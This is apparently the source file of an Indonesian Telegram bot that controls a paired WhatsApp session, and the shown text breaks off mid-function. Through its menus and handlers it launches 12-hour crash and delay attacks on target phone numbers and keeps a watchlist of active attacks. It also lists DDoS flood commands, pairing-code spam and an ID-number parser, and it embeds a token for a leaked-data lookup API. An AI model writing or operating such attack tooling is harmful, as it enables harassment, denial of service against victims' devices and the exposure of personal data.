// Letakkan di paling atas index.js
const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    proto,
    WAProto,
    WAMessageProto,
    MessageTypeProto,
    WAMediaUpload,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { nikParser } = require('nik-parser')
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const axios = require('axios');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
const tokenS = '7340408625:pia6QLBD';
const apiS = 'https://leakosintapi.com/';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Zeph = null;
let deviceList = [];
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomVideos = [
    "https://files.catbox.moe/6hb39u.jpg",
    "https://files.catbox.moe/llwdfe.jpg",
    "https://files.catbox.moe/ro8hst.jpg",
    "https://files.catbox.moe/r76geg.jpg",
    "https://files.catbox.moe/gaoxl0.jpg",
    "https://files.catbox.moe/pg6xgr.jpg",
    "https://files.catbox.moe/l235l7.jpg",
    "https://files.catbox.moe/4at7tg.jpg",
    "https://files.catbox.moe/vx323h.jpg",
    "https://files.catbox.moe/8ywp93.jpg",
    "https://files.catbox.moe/p3wk6q.jpg",
    "https://files.catbox.moe/91z4uq.jpg",
    "https://files.catbox.moe/f4cpgw.jpg",
    "https://files.catbox.moe/ymd466.jpg",
    "https://files.catbox.moe/kr7uq4.jpg"
];

const getRandomVideo = () => randomVideos[Math.floor(Math.random() * randomVideos.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ You are not owner");
    }
    next();
};
const checkOwnerPop = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.answerCbQuery("⛔ You are not owner", { show_alert: true });
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremiumPop = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.answerCbQuery('❌ You are not a premium member', { show_alert: true });
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply('❌ You are not a premium member');
    }
    next();
};

const checkPremiumAi = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return;
    }
    next();
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false, 
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    Zeph = makeWASocket(connectionOptions);

    Zeph.ev.on('creds.update', async () => {
        await saveCreds(); // Pastikan sesi tersimpan
    });

    store.bind(Zeph.ev);

    Zeph.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            try {
                Zeph.newsletterFollow("120363373008401043@newsletter");
            } catch (error) {
                console.error('Newsletter follow error:', error);
            }
            isWhatsAppConnected = true;
            console.log(chalk.bold.white('Connected!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

bot.command("pair", checkPremium, async (ctx) => { const userId = ctx.from.id.toString();

const args = ctx.message.text.split(" ");
if (args.length < 2) {
    return await ctx.reply("Example : /pair 628xxx");
}

let phoneNumber = args[1].replace(/[^0-9]/g, '');

if (!phoneNumber.startsWith('62')) {
    return await ctx.reply("Example : /pair 628xxx");
}

try {
    await startSesi();
    await sleep(1000);
    if (Zeph && Zeph.authState.creds.registered) {
        console.log("ℹ️ WhatsApp already connected, no need to pair again.");
        return await ctx.reply("ℹ️ WhatsApp already connected, no need to pair again.");
    }
    
    const code = await Zeph.requestPairingCode(phoneNumber);
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMessage = `

✅ Pairing Code WhatsApp:

Nomor: ${phoneNumber}\nKode: ${formattedCode}\nafter pair please command /csender`;

await ctx.replyWithMarkdown(pairingMessage);
} catch (error) {
    console.error(chalk.red('Gagal melakukan pairing:'), error);
    await ctx.reply("❌ Pairing failed, please try again later");
}

});

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApps Sender not connected\nPlease /pair to connect sender");
    return;
  }
  next();
};

//========================================//
//#WHATS//
let isSelfMode = false; // Status awal bot di mode public
const mainOwnerId = ownerUsers[0]; // Owner utama yang sah

// Global array penampung serangan aktif

// Fungsi bantu untuk delay
const watchlist = [];
//Ghost Fc
let activeGhostTargets = [];
let ghostLoopStarted = false;
//Delay
let activeStallTargets = [];
let stallLoopStarted = false;
//Ios fc
let activeIosTargets = [];
let iosLoopStarted = false;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Format sisa waktu (hh mm ss)
function formatRemainingTime(endTime) {
    const ms = endTime - Date.now();
    const sec = Math.max(0, Math.floor(ms / 1000));
    const h = String(Math.floor(sec / 3600)).padStart(2, '0');
    const m = String(Math.floor((sec % 3600) / 60)).padStart(2, '0');
    const s = String(sec % 60).padStart(2, '0');
    return `${h}h ${m}m ${s}s`;
}

// Otomatis hapus jika expired
setInterval(() => {
    const now = Date.now();
    for (let i = watchlist.length - 1; i >= 0; i--) {
        if (watchlist[i].endTime <= now) {
            watchlist.splice(i, 1);
        }
    }
}, 5000); // 5 detik

function getWatchlistPage(page = 0) {
    const perPage = 5;
    const start = page * perPage;
    const slice = watchlist.slice(start, start + perPage);
    const totalPage = Math.ceil(watchlist.length / perPage) || 1;

    let text = `📋 *Active Attack List* (Page ${page + 1}/${totalPage})\n\n`;
    const inlineButtons = [];

    if (slice.length === 0) {
        text = '📭 *There are no attacks in progress.*';
    } else {
        // Tampilkan info target
        slice.forEach((target, i) => {
            const globalIndex = start + i;
            const remaining = formatRemainingTime(target.endTime);
            text += `${globalIndex + 1}. Target: ${target.number}\nVirus: ${target.virus}\nRemaining: ${remaining}\n\n`;
        });

        // Tombol Cancel per 2 kolom
        for (let i = 0; i < slice.length; i += 2) {
            const row = [];
            const globalIndex1 = start + i;
            row.push(Markup.button.callback(`Cancel Target ${globalIndex1 + 1}`, `cancel_target_${globalIndex1}`));

            if (i + 1 < slice.length) {
                const globalIndex2 = start + i + 1;
                row.push(Markup.button.callback(`Cancel Target ${globalIndex2 + 1}`, `cancel_target_${globalIndex2}`));
            }

            inlineButtons.push(row);
        }

        // Tombol Navigasi (◀ Back | Next ▶)
        const navRow = [];
        if (page > 0) {
            navRow.push(Markup.button.callback('⌫ Back', `watchlist_page_${page - 1}`));
        }
        if (page + 1 < totalPage) {
            navRow.push(Markup.button.callback('Next ⌦', `watchlist_page_${page + 1}`));
        }
        if (navRow.length > 0) {
            inlineButtons.push(navRow);
        }
    }

    // Hanya tombol kembali ke main menu
    inlineButtons.push([Markup.button.callback('⌂ Back to Main Menu', 'back_to_main')]);

    return {
        text,
        inline_keyboard: inlineButtons
    };
}

// Perintah untuk mengaktifkan SELF mode - hanya owner utama
bot.command('self', async (ctx) => {
    const senderId = ctx.from?.id?.toString();
    if (senderId !== mainOwnerId) return; // Silent jika bukan owner utama

    if (isSelfMode) {
        return ctx.reply("⚠ *Mode self active*", { parse_mode: "Markdown" });
    }

    isSelfMode = true;
    await ctx.reply("🔒 *Private mode is activate!*", {
        parse_mode: "Markdown"
    });
});


bot.command('public', async (ctx) => {
    const senderId = ctx.from?.id?.toString();
    if (senderId !== mainOwnerId) return;

    if (!isSelfMode) {
        return ctx.reply("✅ *Mode public active*", { parse_mode: "Markdown" });
    }

    isSelfMode = false;
    await ctx.reply("✅ *Public mode is activate!*", {
        parse_mode: "Markdown"
    });
});


bot.use(async (ctx, next) => {
    const senderId = ctx.from?.id?.toString();

   
    if (isSelfMode && senderId !== mainOwnerId) {
        return; // silent
    }

    await next();
});

bot.command("csender", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`ℹ️ WhatsApp Sender connected`);
    }
});

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ You have been blacklisted");
    }

    const randomVideo = getRandomVideo();
    const waktuRunPanel = getUptime();

    await ctx.replyWithPhoto(randomVideo, {
        caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗕𝗼𝘁   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘠𝘰𝘶 𝘢𝘳𝘦 𝘤𝘰𝘯𝘯𝘦𝘤𝘵𝘦𝘥 𝘯𝘰𝘸.
[+]  𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘵𝘰 𝘣𝘦𝘨𝘪𝘯.`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [
                Markup.button.callback('𝐆𝐥𝐢𝐭𝐜𝐡', 'hijacked_info'),
                Markup.button.callback('𝐒𝐫𝐜𝐡𝐒𝐢𝐧𝐭', 'home_osint')
            ],
            [
                Markup.button.callback('𝗔𝗹𝗹 𝗠𝗼𝗱𝘂𝗹𝗲 𝗠𝗲𝗻𝘂', 'tools_1')
            ],
            [
                Markup.button.url('𝗗𝗲𝘃𝗼𝗹𝗼𝗽𝗲𝗿', 'https://t.me/dsewrld')
            ]
        ])
    });
});

bot.action('home_osint', async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
  const waktuRunPanel = getUptime();
  const randomVideo = getRandomVideo();
  
  await ctx.answerCbQuery();

  await ctx.editMessageMedia(
    {
      type: 'photo',
      media: randomVideo,
      caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗢𝘀𝗶𝗻𝘁 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘖𝘴𝘴𝘪𝘯𝘵 >> [ 𝘖𝘴𝘴𝘪𝘯𝘵 𝘴𝘦𝘢𝘳𝘤𝘩 ]
[+]  𝘓𝘦𝘨𝘢𝘭𝘪𝘵𝘺 >> [ 𝘖𝘴𝘴𝘪𝘯𝘵 𝘶𝘴𝘢𝘨𝘦 𝘱𝘰𝘭𝘪𝘤𝘺 ]
[+]  𝘞𝘢𝘳𝘯𝘪𝘯𝘨 >> [ 𝘜𝘴𝘦 𝘪𝘵 𝘸𝘪𝘴𝘦𝘭𝘺 ]`,
    },
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            Markup.button.callback('𝗢𝘀𝗶𝗻𝘁', 'osint'),
            Markup.button.callback('𝗟𝗲𝗴𝗮𝗹𝗶𝘁𝘆', 'legality_info')
          ],
          [
            Markup.button.callback('⌫ Back', 'back_to_main')
          ]
        ]
      }
    }
  );
});

bot.action('legality_info', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageCaption(`
   \`\`\`
 𝗟𝗘𝗚𝗔𝗟𝗜𝗧𝗬 Before use

ZnetWrldBot menggunakan modul OSINT (Open Source Intelligence) untuk analisis data terbuka yang tersedia secara legal di internet.

Modul ini berfokus pada transparansi, verifikasi entitas, dan penguatan keamanan informasi melalui metode pencarian publik yang sah.

 Fungsi Modul OSINT:

› Analisis domain, IP, dan jejak digital  
› Verifikasi lisensi dan izin resmi  
› Pemetaan sumber publik seperti PSE, OSS, Whois, Dikti  

› 𝗗𝗶𝘀𝗰𝗹𝗮𝗶𝗺𝗲𝗿: Modul ini dirancang untuk digunakan secara etis dan sah, bukan untuk menyasar individu secara personal. Informasi hanya ditarik dari sumber terbuka dan legal.

ZnetWrldBot berfokus pada 𝗽𝗿𝗲𝘀𝗶𝘀𝗶, bukan sensasi.  
Penggunaan OSINT adalah alat profesional, bukan alat 𝘀𝗲𝗿𝗮𝗻𝗴𝗮𝗻.
\`\`\``, 
   {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '⌫ Back', callback_data: 'home_osint' },
          { text: '⌂ Back to Main Menu', callback_data: 'back_to_main' }
        ]
      ]
    }
  });
});



// Handler untuk tombol "TOOLS 1"
bot.action('tools_1', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(`
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗧𝗼𝗼𝗹𝘀 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ /tls       -  High connection flood
│ /h2        -  High RPS (requests/sec)
│ /glory     -  High request per second

│ /spampair  -  Spam pairing
│ /nik       -  NIK parser

│ /tourl   -  Photo/Vid to url
│ /play   -  Play music yt
│ /tt   -  Link tt

│ /cekid  -  Check id information

〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗢𝘄𝗻𝗲𝗿 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ /public  -  Set bot to public
│ /self  -  Set bot to private

│ /addown  -  Add owner
│ /delown  -  Remove owner
│ /addprem  -  Add premium
│ /delprem  -  Remove premium
│ /cekprem  -  Check premium

│ /csender  -  Check sender info
│ /pair  -  Pair bot session

│ /on  -  Enable AI
│ /off  -  Disable AI

〔   𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼   〕

│ Rloo      — Dev
│ Xzreds    — Partner
│ Supriy    — RIP
│ Reja      — Partner

© 2025 𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗`, 
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('⌫ 𝗕𝗮𝗰𝗸', 'back_to_main')]
        ])
    });
});

// Saat tombol HIJACKED dite
bot.action(/^watchlist_info$|^watchlist_page_(\d+)$/, checkPremiumPop, async (ctx) => {
    const match = ctx.match;
    const page = match[1] ? parseInt(match[1]) : 0;

    const { text, inline_keyboard } = getWatchlistPage(page);

    await ctx.editMessageCaption(text, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard }
    });
});


bot.action(/^cancel_target_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1]);
  const targetObj = watchlist[index];

  if (targetObj) {
    const num = targetObj.number;

    // Hapus dari watchlist  
    watchlist.splice(index, 1);  

    // Hapus dari daftar GhostFinity  
    activeGhostTargets = activeGhostTargets.filter(n => n !== num);  

    // Hapus dari daftar StallFinity  
    activeStallTargets = activeStallTargets.filter(n => n !== num);  

    // Hapus dari daftar iOS FC
    activeIosTargets = activeIosTargets.filter(n => n !== num);

    await ctx.answerCbQuery("✅ Target successfully cancelled.");  

    const page = 0; // bisa diganti kalau pakai page tracking  
    const { text, inline_keyboard } = getWatchlistPage(page);  

    await ctx.telegram.editMessageCaption(  
      ctx.chat.id,  
      ctx.update.callback_query.message.message_id,  
      undefined,  
      text,  
      {  
        parse_mode: "Markdown",  
        reply_markup: {  
          inline_keyboard  
        }  
      }  
    );

  } else {
    await ctx.answerCbQuery("❌ Target not found.", { show_alert: true });
  }
});



// Tombol WATCHLIST nanti kamu bisa isi, sementara placeholder:
bot.action('hijacked_info', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime();
    const randomVideo = getRandomVideo();

    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗚𝗹𝗶𝘁𝗰𝗵 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘎𝘭𝘪𝘵𝘤𝘩𝘺 >> [ 𝘎𝘭𝘪𝘵𝘤𝘩 𝘔𝘰𝘥𝘶𝘭𝘦 ]
[+]  𝘞𝘢𝘵𝘤𝘩𝘓𝘪𝘴𝘵 >> [ 𝘝𝘪𝘦𝘸 𝘙𝘦𝘴𝘶𝘭𝘵𝘴 ]`
        },
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback('𝐆𝐥𝐢𝐭𝐜𝐡', 'cascade_menu'), // Hiasan
                        Markup.button.callback('𝗪𝗮𝘁𝗰𝗵𝗟𝗶𝘀𝘁', 'watchlist_info')
                    ],
                    [
                        Markup.button.callback('⌫ Back', 'back_to_main')
                    ]
                ]
            }
        }
    );
});

// Tombol dummy (hiasan)
bot.action('noop', async (ctx) => {    
await ctx.answerCbQuery();
});

bot.action('cascade_menu', checkPremiumPop, async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime();
    const randomVideo = getRandomVideo();

    await ctx.answerCbQuery();

    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption:
`〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗  𝗚𝗹𝗶𝘁𝗰𝗵 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘐𝘯𝘧𝘪𝘯𝘪𝘵𝘺 >> [ 𝘍𝘶𝘭𝘭 12 𝘩𝘰𝘶𝘳 𝘢𝘵𝘵𝘢𝘤𝘬 ]
[+]  𝘞𝘢𝘳𝘯𝘪𝘯𝘨 >> [ 𝘜𝘴𝘦 𝘪𝘵 𝘸𝘪𝘴𝘦𝘭𝘺 ]`,
        },
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    // Judul Hiasan 1
                    [{ text: 'ᯓ★  𝐀𝐍𝐃𝐑𝐎 𝐌𝐄𝐍𝐔 ', callback_data: 'noop' }],
                    // Tombol GhostFinity | StallFinity
                    [
                        Markup.button.callback('𝙂𝙝𝙤𝙨𝙩 𝙄𝙣𝙛𝙞𝙣𝙩𝙮', 'bug_ghostfinity'),
                        Markup.button.callback('𝙎𝙩𝙖𝙡𝙡 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮', 'bug_stallfinity')
                    ],
                    // Tombol Payload sendirian
                    [Markup.button.callback('𝙋𝙖𝙮𝙡𝙤𝙖𝙙𝙨', 'bug_combofinity')],
                    // Judul Hiasan 2
                    [{ text: 'ᯓ★  𝐓𝐑𝐀𝐒𝐇 𝐢𝐎𝐒 𝐌𝐄𝐍𝐔  ', callback_data: 'noop' }],
                    // Tombol ForceClick sendirian
                    [Markup.button.callback('𝙄𝙊𝙎 𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 𝙄𝙣𝙛𝙞𝙣𝙩𝙮', 'bug_invisibleios')],
                    // Tombol kembali
                    [Markup.button.callback('⌫ Back', 'hijacked_info')]
                ]
            }
        }
    );
});


const awaitingTarget = new Map();
bot.action(/bug_(.+)/, async (ctx) => {
    const bugType = ctx.match[1];
    const userId = ctx.from.id;

    await ctx.answerCbQuery();

    const prompt = await ctx.reply(
        `🧿 *${bugType.toUpperCase()} Selected*\nExample: 628xxx`,
        {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Cancel', callback_data: 'cancel_input' }]
                ]
            }
        }
    );

    awaitingTarget.set(userId, {
        bugType,
        msgIds: [prompt.message_id]
    });
});

bot.on("text", async (ctx, next) => {
    const userId = ctx.from.id;
    const input = ctx.message.text;

    await checkWhatsAppConnection
    if (!awaitingTarget.has(userId)) {
        return next(); // 🔄 lanjut ke handler lain
    }

    const target = awaitingTarget.get(userId);
    const { bugType, msgIds } = target;

    let number = input.replace(/\D/g, '');
    if (number.startsWith("0")) number = "62" + number.slice(1);
    else if (number.startsWith("8")) number = "62" + number;

    if (!/^62[0-9]{8,15}$/.test(number)) {
        const warning = await ctx.reply("❌ Incorrect number format.\nExample: 628xxx");
        msgIds.push(warning.message_id);
        awaitingTarget.set(userId, { bugType, msgIds });
        return;
    }

    const isAlreadyTargeted = watchlist.some(entry => entry.number === number);
    if (isAlreadyTargeted) {
        await ctx.reply(`⚠️ Target ${number} is already under attack.`);
    } else if (bugType.toLowerCase() === "ghostfinity") {
        activeGhostTargets.push(number);
        watchlist.push({
            number,
            virus: 'Crash',
            endTime: Date.now() + 12 * 60 * 60 * 1000
        });
        await ctx.reply(`Crash started on ${number}`);
        if (!ghostLoopStarted) {
            ghostLoopStarted = true;
            startGhostMultiTargetsLoop();
        }
    } else if (bugType.toLowerCase() === "stallfinity") {
        activeStallTargets.push(number);
        watchlist.push({
            number,
            virus: 'Delay',
            endTime: Date.now() + 12 * 60 * 60 * 1000
        });
        await ctx.reply(`Delay started on ${number}`);
        if (!stallLoopStarted) {
            stallLoopStarted = true;
            startStallMultiTargetsLoop();
        }
    } else if (bugType.toLowerCase() === "invisibleios") {
        activeIosTargets.push(number);
        watchlist.push({
            number,
            virus: 'Crash Ios',
            endTime: Date.now() + 12 * 60 * 60 * 1000
        });
        await ctx.reply(`Crash Ios started on ${number}`);
        if (!iosLoopStarted) {
            iosLoopStarted = true;
            startIosInvisMultiTargetsLoop();
        }
    } else if (bugType.toLowerCase() === "combofinity") {
        await replyWithStatus(ctx, number, "FORCE INVIS", async () => {
            for (let i = 0; i < 3; i++) {
                await invisSqL(number + "@s.whatsapp.net");
            }
        });
    } else {
        await ctx.reply(`⚙️ Bug type *${bugType}* belum dihubungkan ke sistem attack.`);
    }

    for (const msgId of msgIds) {
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, msgId);
        } catch (e) { }
    }

    awaitingTarget.delete(userId);
});

async function replyWithStatus(ctx, zepnumb, virus, callback) {
    const msg = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : ${virus}`
    );

    try {
        await callback(); // jalankan proses bug
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
            `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
            `[+] 𝗩𝗜𝗥𝗨𝗦     : ${virus}`
        );
    } catch (e) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            undefined,
            `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
            `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : FAILED\n` +
            `[+] 𝗘𝗥𝗥𝗢𝗥     : ${e.message || e}`
        );
    }
}

// 🧠 Main handler input text


bot.action('cancel_input', async (ctx) => {
    const userId = ctx.from.id;

    if (awaitingTarget.has(userId)) {
        const { msgIds } = awaitingTarget.get(userId);
        for (const msgId of msgIds) {
            try {
                await ctx.telegram.deleteMessage(ctx.chat.id, msgId);
            } catch (e) {}
        }

        awaitingTarget.delete(userId);
        await ctx.reply("❌ Input canceled.");
        await ctx.answerCbQuery();
    } else {
        await ctx.answerCbQuery("There is no active input.");
    }
});

bot.action('back_to_main', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); 
    const randomVideo = getRandomVideo(); 

    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗕𝗼𝘁   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘠𝘰𝘶 𝘢𝘳𝘦 𝘤𝘰𝘯𝘯𝘦𝘤𝘵𝘦𝘥 𝘯𝘰𝘸.
[+]  𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘵𝘰 𝘣𝘦𝘨𝘪𝘯.`
        },
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback('𝐆𝐥𝐢𝐭𝐜𝐡', 'hijacked_info'),
                        Markup.button.callback('𝐒𝐫𝐜𝐡𝐒𝐢𝐧𝐭', 'home_osint')
                    ],
                    [
                        Markup.button.callback('𝗔𝗹𝗹 𝗠𝗼𝗱𝘂𝗹𝗲 𝗠𝗲𝗻𝘂', 'tools_1')
                    ],
                    [
                        Markup.button.url('𝗗𝗲𝘃𝗼𝗹𝗼𝗽𝗲𝗿', 'https://t.me/dsewrld')
                    ]
                ]
            }
        }
    );
});



//FUNCTION FITURE
const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const { InputFile } = require('telegraf');

async function uploadToCatbox(buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm
  });

  const data = await res.text();
  return data;
}

bot.command('tourl', async (ctx) => {
  const msg = ctx.message;

  // Harus reply ke media
  if (!msg.reply_to_message || !(msg.reply_to_message.photo || msg.reply_to_message.video || msg.reply_to_message.document)) {
    return ctx.reply("📎 Reply ke foto atau video yang ingin kamu upload.");
  }

  const media = msg.reply_to_message.photo
    ? msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1]
    : msg.reply_to_message.video || msg.reply_to_message.document;

  const fileId = media.file_id;
  const file = await ctx.telegram.getFile(fileId);
  const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

  // Kirim pesan sedang memproses
  const sentMsg = await ctx.reply("⏳ Mengunggah media...");

  try {
    // Ambil buffer media
    const res = await fetch(fileUrl);
    const buffer = await res.buffer();

    // Validasi tipe
    const { mime } = await fromBuffer(buffer);
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
      return ctx.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, "❌ Hanya gambar atau video mp4 yang didukung.");
    }

    // Upload ke catbox
    const link = await uploadToCatbox(buffer);
